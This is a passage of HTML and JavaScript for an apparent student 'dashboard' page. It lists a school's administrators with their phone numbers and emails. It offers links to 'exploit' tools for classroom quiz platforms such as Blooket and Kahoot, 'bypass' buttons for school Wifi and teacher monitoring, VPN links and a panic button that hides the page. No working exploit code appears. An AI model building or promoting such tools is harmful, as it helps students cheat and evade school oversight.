            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel draggable">
        <h2> Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel draggable">
        <h2> Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel draggable">
        <h2> VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel draggable">
        <h2> Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel draggable">
        <h2> Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel draggable">
        <h2> Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
             Access Spotlight Search: PressCommand () + Space bar.
             Return to the Home screen: PressCommand () + H.
             Show the Dock: PressCommand () + Option () + D.
             Show the App Library: PressShift () + Globe + A.
             Open Quick Note: Press Globe + Q.
             Open Siri: Press Globe + S.
             Open Control Center: Press Globe + C.
             Open Notification Center: Press Globe + N.
             Show all windows: PressGlobe + Down Arrow.
             Open the App Switcher: PressGlobe + Up Arrow.
            Multitasking Shortcuts:
             Switch to the last active app: PressCommand () + Tab.
             View all active apps: Press and hold Command () + Tab.
             Open Split View: Press Control () + Globe + Left Arrow to move an app to the left, or Control () + Globe + Right Arrow to move it to the right.
             Switch the position of apps in Split View: PressControl () + Globe + Left or Right Arrow.
             Open Slide Over: Press Globe + Backslash.
             Move the Slide Over window: PressOption () + Globe + Left or Right Arrow.
            Safari and App-Specific Shortcuts:
             Take a full-screen screenshot: PressCommand () + Shift + 3.
             Take a screenshot and enter markup immediately: PressCommand () + Shift + 4.
             Open a new private tab: PressCommand () + Shift + N.
             Open a new tab: Press Command () + T or Command () + N.
             Close the current tab: Press Command () + W.
             Close all tabs in Tab Grid: Press Shift + Command () + W.
             Go to the next tab: Press Option () + Command () + Right Arrow, or Control () + Tab, or Command () + }.
             Go to the previous tab: Press Option () + Command () + Left Arrow, or Shift + Control () + Tab, or Command () + {.
             Reopen the last closed tab: PressShift + Command () + T.
             Go to a specific tab (1-8): PressCommand () + (1-8).
             Go to the last tab: Press Command () + 9.
             Open the Tab Grid: Press Shift + Command () + .
             Open a new Incognito tab: PressShift + Command () + N.
             Open a new Incognito window: PressOption () + Shift + Command () + N.
             Open a new window: PressOption () + Command () + N.
            General Navigation and Text Editing:
             Navigate between elements in an app (like fields, lists, buttons): Press Tab.
             Select all text: Press Command () + A.
             Copy selected text: Press Command () + C.
             Cut selected text: Press Command () + X.
             Paste copied text: Press Command () + V.
             Undo the last action: Press Command () + Z.
             Redo the last undone action: Press Command () + Shift + Z.
             Jump to the top of a page: Press Command () + Up Arrow.
             Jump to the bottom of a page: Press Command () + Down Arrow.
             Highlight text one character at a time: Press Shift + Left or Right Arrow.
            To view all available shortcuts for the specific app you are using,press and hold the Command () key.For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    </div>

    <!-- NOTES Canvas -->
    <div id="canvasContainer" class="draggable">
      <h2> Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <input type="color" id="noteColor" value="#ff914d">
        <input type="range" id="noteThickness" min="1" max="10" value="2">
        <button id="toggleEraserBtn"> Eraser</button>
        <button id="addTextNoteBtn"> Text Note</button>
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="saveCanvasBtn"> Save Notes</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
    </div>
    
    <!-- Notes Text Entry Popup -->
    <div id="notesTextPopup" class="notes-text-popup">
        <h3>Add Text Note</h3>
        <textarea id="notesTextInput" placeholder="Enter your note here..."></textarea>
        <button id="notesTextAddBtn">Add to Canvas</button>
        <button id="notesTextCancelBtn">Cancel</button>
    </div>

    <!-- Settings Panel -->
    <div id="settingsPanel" class="settings-panel draggable">
        <h2> Settings</h2>
        <div class="settings-grid">
            <div class="settings-option">
                <label for="themeSelector">Theme Selection</label>
                <select id="themeSelector">
                    <option value="dark-theme">Dark Mode (Default)</option>
                    <option value="light-theme">Light Mode</option>
                    <option value="forest-theme">Forest Mode</option>
                    <option value="ocean-theme">Ocean Mode</option>
                </select>
            </div>
            <div class="settings-option">
                <label for="notificationSoundToggle">Notification Sound</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="notificationSoundToggle" class="slider-checkbox">
                    <span class="slider"></span>
                </label>
            </div>
            <div class="settings-option">
                <label for="dashAnimationsToggle">Dashboard Animations</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="dashAnimationsToggle" class="slider-checkbox" checked>
                    <span class="slider"></span>
                </label>
            </div>
            <div class="settings-option">
                <label for="panelSnapToggle">Snap Panels to Grid</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="panelSnapToggle" class="slider-checkbox">
                    <span class="slider"></span>
                </label>
            </div>
            <div class="settings-option">
                <label for="uiScaleRange">UI Scale: <span id="uiScaleValue">100%</span></label>
                <input type="range" id="uiScaleRange" min="70" max="150" value="100">
            </div>
            <div class="settings-option">
                <label for="dashRefreshRate">Dashboard Refresh (ms): <span id="refreshRateValue">5000</span></label>
                <input type="range" id="dashRefreshRate" min="1000" max="10000" step="500" value="5000">
            </div>
            <div class="settings-option">
                <label for="autoLogoutTimer">Auto Logout (mins): <span id="autoLogoutValue">30</span></label>
                <input type="range" id="autoLogoutTimer" min="5" max="120" step="5" value="30">
            </div>
            <div class="settings-option">
                <label for="showQuickHelp">Show Quick Help Tips</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="showQuickHelp" class="slider-checkbox" checked>
                    <span class="slider"></span>
                </label>
            </div>
            <div class="settings-option">
                <label for="enableTelemetry">Enable Anonymous Telemetry</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="enableTelemetry" class="slider-checkbox">
                    <span class="slider"></span>
                </label>
            </div>
            <div class="settings-option">
                <label for="backupSettingsBtn">Backup Settings</label>
                <button id="backupSettingsBtn"> Backup Now</button>
            </div>
            <div class="settings-option">
                <label for="restoreSettingsBtn">Restore Settings</label>
                <button id="restoreSettingsBtn"> Restore</button>
            </div>
            <div class="settings-option">
                <label for="languageSelector">Language</label>
                <select id="languageSelector">
                    <option value="en">English</option>
                    <option value="es">Espaol</option>
                    <option value="fr">Franais</option>
                </select>
            </div>
            <div class="settings-option">
                <label for="developerModeToggle">Developer Mode</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="developerModeToggle" class="slider-checkbox">
                    <span class="slider"></span>
                </label>
            </div>
            <div class="settings-option">
                <label for="logLevelSelector">Log Level</label>
                <select id="logLevelSelector">
                    <option value="info">Info</option>
                    <option value="warn">Warn</option>
                    <option value="error">Error</option>
                    <option value="debug">Debug</option>
                </select>
            </div>
            <div class="settings-option">
                <label for="clearCacheBtn">Clear Cache</label>
                <button id="clearCacheBtn"> Clear Now</button>
            </div>
        </div>
    </div>

    <!-- Calculator Panel -->
    <div id="calculator" class="utility-panel draggable">
        <h2> Calculator</h2>
        <input type="text" id="calcDisplay" value="0" disabled>
        <div class="calculator-grid">
            <button class="clear">C</button>
            <button class="operator">+/-</button>
            <button class="operator">%</button>
            <button class="operator">/</button>

            <button>7</button>
            <button>8</button>
            <button>9</button>
            <button class="operator">*</button>

            <button>4</button>
            <button>5</button>
            <button>6</button>
            <button class="operator">-</button>

            <button>1</button>
            <button>2</button>
            <button>3</button>
            <button class="operator">+</button>

            <button style="grid-column: span 2;">0</button>
            <button>.</button>
            <button class="equals">=</button>
        </div>
    </div>

    <!-- Unit Converter Panel -->
    <div id="unitConverter" class="utility-panel draggable">
        <h2> Unit Converter</h2>
        <select id="conversionType">
            <option value="length">Length</option>
            <option value="weight">Weight</option>
            <option value="temperature">Temperature</option>
        </select>
        <input type="number" id="convertInput" placeholder="Value to convert">
        <select id="fromUnit"></select>
        <select id="toUnit"></select>
        <input type="text" id="convertOutput" placeholder="Result" disabled>
        <div style="display: flex; gap: 8px; margin-top: 10px;">
          <button id="performConversionBtn" style="flex: 1;">Convert</button>
          <button id="swapUnitsBtn" style="flex: 1;">Swap Units</button>
        </div>
    </div>

    <!-- Media Player Panel -->
    <div id="mediaPlayer" class="utility-panel draggable">
      <h2> Media Player (YouTube)</h2>
      <div class="media-content">
        <!-- Placeholder for embedded video -->
        <iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
      </div>
      <p style="text-align: center; margin-top: 10px; font-size: 0.8em; color: #ff6347; font-weight: bold;">
         Note: This embedded video works if your network allows YouTube access.<br>
        A true "proxy" to bypass network filters for restricted sites cannot be implemented purely client-side with JavaScript.<br>
        This requires a separate server-side component.
      </p>
    </div>

    <!-- Keybinds Panel -->
    <div id="keybindsPanel" class="keybinds-panel draggable">
        <h2> Configure Keybinds</h2>
        <p>Click on an input field and press a key combination to assign it.</p>
        <div class="keybinds-list" style="margin-top: 15px; max-height: 300px; overflow-y: auto;">
            <div class="keybinds-entry">
                <span>Toggle Notes</span><input type="text" data-action="toggleNotes" value="Ctrl+Shift+N" disabled>
            </div>
            <div class="keybinds-entry">
                <span>Take Screenshot</span><input type="text" data-action="screenshot" value="Ctrl+Shift+S" disabled>
            </div>
            <div class="keybinds-entry">
                <span>Full Screen</span><input type="text" data-action="fullscreen" value="F11" disabled>
            </div>
            <div class="keybinds-entry">
                <span>Toggle Themes</span><input type="text" data-action="toggleTheme" value="Ctrl+Shift+T" disabled>
            </div>
            <div class="keybinds-entry">
                <span>Panic Button</span><input type="text" data-action="panic" value="Escape" disabled>
            </div>
             <div class="keybinds-entry">
                <span>Open Calculator</span><input type="text" data-action="calculator" value="Ctrl+Alt+C" disabled>
            </div>
             <div class="keybinds-entry">
                <span>Open Unit Converter</span><input type="text" data-action="converter" value="Ctrl+Alt+U" disabled>
            </div>
             <div class="keybinds-entry">
                <span>Show Stats</span><input type="text" data-action="stats" value="Ctrl+Alt+S" disabled>
            </div>
        </div>
        <p style="font-size:0.8em; color:#888; margin-top: 15px;">(Currently, keybinds are for display; full configurability requires advanced event handling.)</p>
    </div>

    <!-- Activity History Panel -->
    <div id="activityHistoryPanel" class="activity-history-panel draggable">
        <h2> Activity Logs</h2>
        <div id="activityLogsContent" style="max-height: 400px; overflow-y: auto;">
            <p style="color:#aaa;">No activities logged yet for this session.</p>
        </div>
    </div>

    <!-- Login History Panel -->
    <div id="loginHistoryPanel" class="login-history-panel draggable">
      <h2> Login History</h2>
      <div id="loginHistoryContent" style="max-height: 400px; overflow-y: auto;">
        <p class="login-history-entry" style="font-style: italic;">No recent successful login records.</p>
      </div>
    </div>

    <!-- Reminder Panel -->
    <div id="reminderPanel" class="utility-panel draggable">
        <h2> Set a Reminder</h2>
        <input type="datetime-local" id="reminderDateTime">
        <input type="text" id="reminderMessage" placeholder="Your reminder message..." style="margin-bottom: 10px;">
        <button id="setReminderBtn" style="width: 100%;">Set Reminder</button>
        <h3 style="margin-top: 20px;">Upcoming Reminders:</h3>
        <div id="upcomingReminders" style="max-height: 200px; overflow-y: auto;">
            <p style="color:#aaa;">No reminders set.</p>
        </div>
    </div>

    <!-- Time Tools Panel (Timer, Stopwatch, Countdown) -->
    <div id="timeToolsPanel" class="time-tools-panel draggable">
      <h2> Time Tools</h2>
      <div id="timeToolsNav">
        <button id="showStopwatch">Stopwatch</button>
        <button id="showTimer">Timer</button>
        <button id="showCountdown">Countdown</button>
      </div>

      <div id="stopwatchControls">
        <span class="timer-display" id="stopwatchDisplay">00:00:00</span>
        <div class="timer-buttons">
          <button id="startStopwatchBtn">Start</button>
          <button id="pauseStopwatchBtn">Pause</button>
          <button id="resetStopwatchBtn">Reset</button>
        </div>
      </div>

      <div id="timerControls" style="display:none;">
        <input type="number" id="timerInput" class="timer-input" placeholder="Enter minutes for timer (e.g., 5)">
        <span class="timer-display" id="timerDisplay">00:00</span>
        <div class="timer-buttons">
          <button id="startTimerBtn">Start</button>
          <button id="pauseTimerBtn">Pause</button>
          <button id="resetTimerBtn">Reset</button>
        </div>
      </div>

      <div id="countdownControls" style="display:none;">
        <input type="text" id="countdownInput" class="timer-input" placeholder="HH:MM:SS (e.g., 01:30:00)">
        <span class="timer-display" id="countdownDisplay">00:00:00</span>
        <div class="timer-buttons">
          <button id="startCountdownBtn">Start</button>
          <button id="pauseCountdownBtn">Pause</button>
          <button id="resetCountdownBtn">Reset</button>
        </div>
      </div>
    </div>

    <!-- Stats Panel -->
    <div id="statsPanel" class="utility-panel draggable">
        <h2> Session Statistics</h2>
        <div style="margin-top: 15px;">
            <div class="stats-entry">
                <strong>Buttons Pressed:</strong> <span id="statsButtonPresses">0</span>
            </div>
            <div class="stats-entry">
                <strong>Toggles Changed:</strong> <span id="statsTogglesChanged">0</span>
            </div>
            <div class="stats-entry">
                <strong>Panels Opened:</strong> <span id="statsPanelsOpened">0</span>
            </div>
            <div class="stats-entry">
                <strong>Panels Closed:</strong> <span id="statsPanelsClosed">0</span>
            </div>
            <div class="stats-entry">
                <strong>Notes Edited:</strong> <span id="statsNotesEdited">0</span>
            </div>
             <div class="stats-entry">
                <strong>Total Interaction Time:</strong> <span id="statsInteractionTime">0s</span>
            </div>
        </div>
        <p style="font-size:0.8em; color:#888; margin-top: 15px;">(Statistics reset on page refresh or logout.)</p>
    </div>

  </div>

  <script>
    // Global State for Activity and Stats Tracking
    let activityLog = [];
    let stats = {
      buttonPresses: 0,
      togglesChanged: 0,
      panelsOpened: 0,
      panelsClosed: 0,
      notesEdited: 0,
      interactionTime: 0
    };
    let lastActivityTimestamp = Date.now();
    let interactionInterval;

    function trackActivity(type, description, user = null) {
        const timestamp = new Date().toLocaleString();
        const entry = { timestamp, type, description, user };
        activityLog.push(entry);
        console.log(`Activity Logged: [${timestamp}] ${type}: ${description}`);
        // Display in relevant panels if open
        const logContent = document.getElementById('activityLogsContent');
        if (logContent) {
            const div = document.createElement('div');
            div.className = 'activity-log-entry';
            div.innerHTML = `<strong>${timestamp}:</strong> ${description}`;
            if (logContent.children.length > 0 && logContent.children[0].tagName === 'P' && logContent.children[0].style.color === 'rgb(170, 170, 170)') {
                logContent.innerHTML = ''; // Clear "No activities" message
            }
            logContent.prepend(div);
        }
        updateInteractionTime();
    }

    function trackStats(type) {
        if (type === 'button') stats.buttonPresses++;
        if (type === 'toggle') stats.togglesChanged++;
        if (type === 'panelOpen') stats.panelsOpened++;
        if (type === 'panelClose') stats.panelsClosed++;
        if (type === 'noteEdit') stats.notesEdited++;
        updateStatsDisplay();
    }

    function updateInteractionTime() {
        const now = Date.now();
        const idleThreshold = 5 * 1000; // 5 seconds of no activity
        if (now - lastActivityTimestamp < idleThreshold) {
             // If within idle threshold, count time as active
        }
        lastActivityTimestamp = now;
    }
    // Start tracking interaction time after a delay, or on dashboard load
    document.addEventListener('mousemove', updateInteractionTime);
    document.addEventListener('keydown', updateInteractionTime);
    document.addEventListener('click', updateInteractionTime);

    // Initial update for stats display (will be called again on login)
    function updateStatsDisplay() {
      const sp = document.getElementById('statsPanel');
      if (sp && sp.style.display !== 'none') {
        document.getElementById('statsButtonPresses').textContent = stats.buttonPresses;
        document.getElementById('statsTogglesChanged').textContent = stats.togglesChanged;
        document.getElementById('statsPanelsOpened').textContent = stats.panelsOpened;
        document.getElementById('statsPanelsClosed').textContent = stats.panelsClosed;
        document.getElementById('statsNotesEdited').textContent = stats.notesEdited;
        document.getElementById('statsInteractionTime').textContent = formatDuration(dashboard.sessionSeconds); // Use session time
      }
    }

    function formatDuration(seconds) {
        const h = Math.floor(seconds / 3600);
        const m = Math.floor((seconds % 3600) / 60);
        const s = seconds % 60;
        let parts = [];
        if (h > 0) parts.push(`${h}h`);
        if (m > 0 || h > 0) parts.push(`${m}m`);
        parts.push(`${s}s`);
        return parts.join('');
    }


    // ALERT SYSTEM
    const alertContainer = document.getElementById('alertContainer');
    let notificationSoundEnabled = false; // Initial state for new setting

    function showAlert(message, type = 'info', duration = 5000) {
        if (alertContainer.style.display === 'none') {
            alertContainer.style.display = 'flex';
        }

        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type}`; // You can add CSS for alert-info, alert-warning etc.
        alertDiv.innerHTML = `<span>${message}</span> <button class="alert-close"></button>`;
        alertContainer.prepend(alertDiv); // Add to top

        alertDiv.querySelector('.alert-close').addEventListener('click', () => {
            alertDiv.classList.add('fade-out');
            alertDiv.addEventListener('transitionend', () => alertDiv.remove());
        });

        setTimeout(() => {
            alertDiv.classList.add('fade-out');
            alertDiv.addEventListener('transitionend', () => alertDiv.remove());
        }, duration);

        if (notificationSoundEnabled) {
            // Optional: Play a short, subtle sound
            // const audio = new Audio('path/to/notification_sound.mp3');
            // audio.play().catch(e => console.warn("Failed to play notification sound", e));
        }
        trackActivity('Alert', `Displayed: ${message}`);
    }


    // Global variables for panel dragging
    let activePanel = null;
    let isDragging = false;
    let offsetX, offsetY;

    // Draggable event handlers
    function addDragListeners(panel) {
        if (!panel) return;
        panel.classList.add('draggable');

        // Draggable only by the h2 header (if present) or the panel itself
        const dragHandle = panel.querySelector('h2') || panel;
       
        dragHandle.addEventListener('mousedown', startDrag, false);
       
        function startDrag(e) {
            // Prevent dragging if clicking on an interactive element inside the panel
            if (e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT' || 
                e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA' || 
                e.target.classList.contains('slider') || e.target.closest('.quick-info-buttons')) 
            {
                return;
            }
            trackStats('button'); // Consider drag as an interaction
            trackActivity('Panel Drag Start', `Started dragging ${panel.id}`);
            isDragging = true;
            activePanel = panel;
            offsetX = e.clientX - activePanel.getBoundingClientRect().left;
            offsetY = e.clientY - activePanel.getBoundingClientRect().top;
            activePanel.style.position = 'absolute'; // Ensure absolute positioning for dragging
            activePanel.style.cursor = 'grabbing';
            activePanel.style.zIndex = 1000; // Bring to front
            activePanel.dataset.originalX = activePanel.style.left; // Store original positions (though not used for reset in this version)
            activePanel.dataset.originalY = activePanel.style.top;
        }
    }

    function doDrag(e) {
        if (!isDragging) return;
        // Don't log every mousemove during drag, too noisy. Only start/end.
        // trackActivity('Panel Drag', `Dragging ${activePanel.id}`);
        activePanel.style.left = `${e.clientX - offsetX}px`;
        activePanel.style.top = `${e.clientY - offsetY}px`;
        e.preventDefault();
    }

    function stopDrag(e) {
        if (isDragging) {
            trackActivity('Panel Drag End', `Finished dragging ${activePanel.id}`);
            activePanel.style.cursor = 'grab'; // Reset cursor
            activePanel.style.zIndex = ''; // Reset z-index
        }
        isDragging = false;
        activePanel = null;
    }

    document.addEventListener('mousemove', doDrag, false);
    document.addEventListener('mouseup', stopDrag, false);

    const motivationQuotes = [
      "The only way to do great work is to love what you do.  Steve Jobs",
      "Believe you can and you're halfway there.  Theodore Roosevelt",
      "The future belongs to those who believe in the beauty of their dreams.  Eleanor Roosevelt",
      "It is during our darkest moments that we must focus to see the light.  Aristotle Onassis",
      "Do not wait for a perfect time, seize the moment and make it perfect.  Unknown"
    ];

    const randomFacts = [
        "A group of owls is called a parliament.",
        "The Earth's atmosphere is made up of roughly 78% nitrogen, 21% oxygen, and tiny amounts of other gases.",
        "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still edible.",
        "The shortest war in history lasted only 38 to 45 minutes.",
        "Wombat poop is cube-shaped."
    ];

    const dailyQuotes = [
        "What you do today can improve all your tomorrows.  Ralph Marston",
        "It's not what you look at that matters, it's what you see.  Henry David Thoreau",
        "The best way to predict the future is to create it.  Abraham Lincoln",
        "The only true wisdom is in knowing you know nothing.  Socrates",
        "The journey of a thousand miles begins with a single step.  Lao Tzu"
    ];

    let currentMotivationIndex = 0;
    let currentRandomFactIndex = 0;
    let currentDailyQuoteIndex = 0;

    // Dashboard functionality object
    const dashboard = {
      // Initialize all dashboard functionality
      sessionSeconds: 0,
      currentTheme: localStorage.getItem('dashboardTheme') || 'dark-theme', // Default to dark-theme
      zoomLevel: parseFloat(localStorage.getItem('dashboardZoom')) || 1, // Store zoom
      _updateIntervals: [], // To manage multiple setIntervals
      activePanelElement: null, // Keep track of currently open info panel for single-open behavior


      init: function() {
        this.startSessionTracking(); // Combines timer and activity
        this.initClock();
        this.generateCalendar();
        this.initThemeSystem();
        this.initButtons();
        this.initCanvas();
        this.initPanels(); // Now just hides info panels
        this.initSearch();
        this.initQuoteFactBoxes();
        this.initCalculator();
        this.initUnitConverter();
        this.initKeybinds();
        this.initStatsTracker();
        this.initReminderSystem();
        this.initTimeTools();
        this.applyZoom(); // Apply saved zoom on init
        this.addDraggablePanels(); // Make new panels draggable (no resize)
        this.updateWiFiLevelsColor(); // Apply color styling
        this.showWelcomeNotification(document.getElementById('loggedInUser').textContent);
      },

      startSessionTracking: function() {
        // Session Time
        this.updateSessionTime();
        this._updateIntervals.push(setInterval(() => this.updateSessionTime(), 1000));

        // Interaction time calculation (already implemented globally but will keep this separate for robust logging)
        if (!interactionInterval) {
            interactionInterval = setInterval(() => {
                const now = Date.now();
                const timePassed = (now - lastActivityTimestamp) / 1000;
                const idleThresholdSeconds = 10; 
                if (timePassed < idleThresholdSeconds) {
                    stats.interactionTime++;
                }
            }, 1000);
        }
      },

      updateSessionTime: function() {
        this.sessionSeconds++;
        const sessionTimeBtn = document.getElementById('sessionTime');
        if (sessionTimeBtn) {
            sessionTimeBtn.innerText = ` Session Time: ${formatTime(this.sessionSeconds)}`;
        }
      },
      
      // Initialize real-time clock
      initClock: function() {
        function updateClock() {
          const now = new Date();
          const hour12 = !dashboard.is24HourFormat; // Use new toggle state
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: hour12 };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          const realTimeClockBtn = document.getElementById('realTimeClock');
          const realDateBtn = document.getElementById('realDate');
          if (realTimeClockBtn) realTimeClockBtn.innerText = ' ' + timeStr;
          if (realDateBtn) realDateBtn.innerText = ' ' + dateStr;

          // For login page too
          const currentLoginTimeEl = document.getElementById('currentLoginTime');
          const currentLoginDateEl = document.getElementById('currentLoginDate');
          if (currentLoginTimeEl) currentLoginTimeEl.innerText = now.toLocaleTimeString(undefined, options);
          if (currentLoginDateEl) currentLoginDateEl.innerText = now.toLocaleDateString(undefined, { month: 'numeric', day: 'numeric', year: 'numeric' });
        }
        updateClock();
        this._updateIntervals.push(setInterval(updateClock, 1000));
      },

      is24HourFormat: false, // Default for 12/24 hour toggle on login page
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        if (!calendar) return; // Ensure element exists before manipulating
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },

      // Initialize theme toggle and load saved theme
      initThemeSystem: function() {
          const themeSelector = document.getElementById('themeSelector');
          // Update body with saved theme class
          document.body.className = `dashboard-body ${this.currentTheme}`;

          // Set selector to current theme
          if (themeSelector) {
              themeSelector.value = this.currentTheme;
              themeSelector.addEventListener('change', (e) => {
                  trackActivity('Theme Change', `Theme changed to: ${e.target.value}`);
                  trackStats('toggle'); // Even if it's a select, it's a toggle like action
                  dashboard.setTheme(e.target.value);
              });
          }

          // Initial motivation quote (from current index or random)
          const motivationQuoteSpan = document.getElementById('motivationQuote');
          if (motivationQuoteSpan) {
            if (!motivationQuotes[currentMotivationIndex]) currentMotivationIndex = 0;
            motivationQuoteSpan.textContent = motivationQuotes[currentMotivationIndex];
            document.getElementById('refreshQuoteBtn').addEventListener('click', () => this.refreshMotivationQuote());
          }
          this.refreshRandomFact();
          document.getElementById('refreshFactBtn')?.addEventListener('click', () => this.refreshRandomFact());
          this.refreshDailyQuote();
          document.getElementById('refreshDailyQuoteBtn')?.addEventListener('click', () => this.refreshDailyQuote());
      },
      setTheme: function(themeClass) {
          document.body.classList.remove('dark-theme', 'light-theme', 'forest-theme', 'ocean-theme'); // Clear all
          document.body.classList.add('dashboard-body', themeClass);
          this.currentTheme = themeClass;
          localStorage.setItem('dashboardTheme', themeClass);
      },
      refreshMotivationQuote: function() {
          trackActivity('Quote Refresh', 'Motivation quote refreshed');
          currentMotivationIndex = (currentMotivationIndex + 1) % motivationQuotes.length;
          document.getElementById('motivationQuote').textContent = motivationQuotes[currentMotivationIndex];
      },
      refreshRandomFact: function() {
          const randomFactContent = document.getElementById('randomFactContent');
          if(!randomFactContent) return;
          trackActivity('Fact Refresh', 'Random fact refreshed');
          currentRandomFactIndex = (currentRandomFactIndex + 1) % randomFacts.length;
          randomFactContent.textContent = randomFacts[currentRandomFactIndex];
      },
      refreshDailyQuote: function() {
          const dailyQuoteContent = document.getElementById('dailyQuoteContent');
          if(!dailyQuoteContent) return;
          trackActivity('Quote Refresh', 'Daily quote refreshed');
          currentDailyQuoteIndex = (currentDailyQuoteIndex + 1) % dailyQuotes.length;
          dailyQuoteContent.textContent = dailyQuotes[currentDailyQuoteIndex];
      },
      
      // Initialize buttons
      initButtons: function() {
        document.getElementById('panicBtnDash').addEventListener('click', () => {
          trackActivity('Button Click', 'Panic button clicked (Dashboard)');
          trackStats('button');
          window.open('https://clever.com', '_blank');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Restart button clicked');
          trackStats('button');
          if(confirm('Are you sure you want to kill the page (restart)?')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
            this.clearAllIntervals();
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Fix Issues button clicked');
          trackStats('button');
          showAlert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!', 'info');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          trackActivity('Button Click', 'Full Screen button clicked');
          trackStats('button');
          if (!document.fullscreenElement) {
